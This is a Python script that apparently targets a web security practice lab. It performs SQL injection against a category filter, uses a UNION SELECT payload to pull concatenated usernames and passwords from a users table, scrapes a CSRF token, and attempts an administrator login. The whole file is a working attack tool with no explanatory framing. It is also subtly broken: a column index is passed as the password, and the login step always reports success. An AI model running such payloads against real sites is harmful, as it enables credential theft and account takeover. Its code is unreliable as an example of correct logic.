import sys
import requests
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
def sqli_exploit(url):
    uri = "/filter?category=Gifts"
    # r = requests.get(url + uri + payload + " --",verify=False,proxies=proxies)
    payload =1
    while True:
        print("still requesting")
        r = requests.get(url + uri + " 'order by %d"% payload + " --",verify=False,proxies=proxies)
        if 'Internal Server Error' in r.text:
            return payload -1
        else:
            payload = payload + 1
def sqli_exploit_string(url,num):
    path = "/filter?category=Gifts"
    for i in range(1,num+1):
        string = "username || '*' || password"
        payload_list = ['null'] * num
        payload_list[i-1] = string
        sqli_payload = " 'Union select " +",".join(payload_list) + ' from users'+ ' order by 1'+ " --"
        print(",".join(payload_list))
        print(sqli_payload)
        r = requests.get(url+path+sqli_payload,verify=False,proxies=proxies)
        res = r.text
        if "leq7hdy" in res:
            return i
    else:
        return False
def sqli_exploit_get_csrf(s,url):
    res = s.get(url + '/login',verify=False,proxies=proxies)
    csrf_soup = BeautifulSoup(res.text,'html.parser')
    csrf_token = csrf_soup.find("input")['value']
    print("csrf token is here " + csrf_token)
    return csrf_token 
def sqli_exploit_login(s,url,password,csrf):
    data = {'csrf':csrf,'username':'administrator','password':password}
    res = s.post(url+'/login',data=data,verify=False,proxies=proxies)
    if 'Log out' in res.text: print("[+] Logged in succesfully ")
    else:
        print("[-] logged in failed for final login")
    return True
if __name__ =="__main__":
    try:
        url = sys.argv[1].strip()
        s = requests.session()
    except IndexError:
        print("[-] Usage %s <url>"% sys.argv[0].strip())
        print("[-] Example %s example.com + uri + order by 1 -- "% sys.argv[0].strip())
        sys.exit(-1)
    num = sqli_exploit(url)
    if num:
            print("[+] SQL Injection succesfull and column no is %d "%num)
            print("[+} Figuring out which field contain string  " )
            passs = sqli_exploit_string(url,num)
            if passs:
                print("[+] string command run succesfully ")
            else:
                print("[-] string command failed ")
    
            cssrf = sqli_exploit_get_csrf(s,url)
            if cssrf:
                print("[+] csrf token extracted succesfully")
            else:
                print("[-] csr token extraction failed")
            lgoin = sqli_exploit_login(s,url,passs,cssrf)
            if lgoin:
                print(" [+] final step executed succesfully ")
            else:
                print("[-] final step failed")

    else:
        print("[-] SQL Injection failed! try other method")
